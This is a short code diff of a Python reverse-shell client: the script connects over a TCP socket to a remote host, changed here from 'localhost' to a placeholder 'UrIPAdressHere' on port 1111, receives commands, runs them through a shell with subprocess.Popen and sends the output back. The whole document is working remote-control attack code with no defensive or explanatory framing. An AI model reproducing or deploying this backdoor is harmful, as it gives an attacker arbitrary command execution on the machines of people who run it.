@@ -1,7 +1,7 @@
 import os, socket, subprocess
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("localhost", 1111))
+s.connect(("UrIPAdressHere", 1111))
 invalidsChars = ["é", "ç", "è", "à", "ù"]
 
 while True:
@@ -11,7 +11,6 @@ while True:
 	s.send(a)
 	cmd = s.recv(1024)
 	cmd = cmd.decode()
-	back = os.popen(cmd).read()
 	back = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
 	out, err = back.communicate()
 	if out == b"" and err != b"":
